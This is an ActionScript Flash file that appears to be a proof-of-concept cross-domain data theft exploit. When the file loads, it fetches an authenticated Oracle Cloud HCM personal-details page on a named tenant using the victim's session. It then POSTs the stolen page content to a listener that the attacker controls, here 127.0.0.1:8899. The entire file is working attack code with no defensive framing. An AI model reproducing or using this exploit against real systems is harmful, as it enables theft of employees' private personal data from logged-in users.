package {
 import flash.display.Sprite;
 import flash.events.*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLVariables;
 import flash.net.URLLoader;
 import flash.net.URLLoaderDataFormat;

 public class crossDomain extends Sprite {
  public function crossDomain() {
   // grab DOM from target page
   var firstrequest:URLRequest = new URLRequest("https://eohz.fa.ap1.oraclecloud.com/hcmUI/faces/FuseOverview?fnd=%252FWEB-INF%252Foracle%252Fapps%252Fhcm%252FhomePage%252FpublicUi%252FquickAction%252Fflow%252FHcmDataSecurityCheckFlow.xml%2523HcmDataSecurityCheckFlow%3BfndWarnChanges%253D%2523%257BProfile.values.HCM_SAVE_CHANGES_WARNING_ENABLED%2Beq%2B%2527Y%2527%257D%253BrootMenuGroupNodeId%253D%2523%257B%2527groupNode_my_information%2527%257D%253BquickActionItemNodeId%253D%2523%257B%2527me_personal_details%2527%257D%253Bheader%253D%2523%257BadfBundle%255B%2527oracle.apps.hcm.people.resource.HcmPeopleTopGenBundle%2527%255D%255B%2527Header.PersonalDetails%2527%255D%257D%3B%3BPersonal%2BDetails%3Bfalse%3B256%3B%3B%3B&pageParams=fndDetailsMode%3Dtrue%3BreturnFndUrl%3Dhttps%3A%2F%2Feohz.fa.ap1.oraclecloud.com%3A443%2FfscmUI%2Ffaces%2FFuseWelcome&fndDetailsMode=true&returnFndUrl=https%3A%2F%2Feohz.fa.ap1.oraclecloud.com%3A443%2FfscmUI%2Ffaces%2FFuseWelcome&_afrLoop=6900442202825496&_afrWindowMode=0&_afrWindowId=rl3o1g9vs&_adf.ctrl-state=xxxez84j7_378&_afrFS=16&_afrMT=screen&_afrMFW=1846&_afrMFH=1009&_afrMFDW=1920&_afrMFDH=1080&_afrMFC=8&_afrMFCI=0&_afrMFM=0&_afrMFR=96&_afrMFG=0&_afrMFS=0&_afrMFO=0");
   var firstloader:URLLoader = new URLLoader();
   firstloader.addEventListener(Event.COMPLETE, completeHandler);
   try {
    firstloader.load(firstrequest);
   } catch (error: Error) {
    trace("Unable to load URL: " + error);
   }

  }

  private function completeHandler(event: Event): void {

   // Send data to a place where we can listen for it
   // typically the same webserver that served the flash file
   var request:URLRequest = new URLRequest("127.0.0.1:8899");
   var variables:URLVariables = new URLVariables();
   variables.data = event.target.data;
   request.method = URLRequestMethod.POST;
   request.data = variables;
   var loader:URLLoader = new URLLoader();
   try {
    loader.load(request);
   } catch (error: Error) {
    trace("Unable to load URL");
   }
  }
 }
}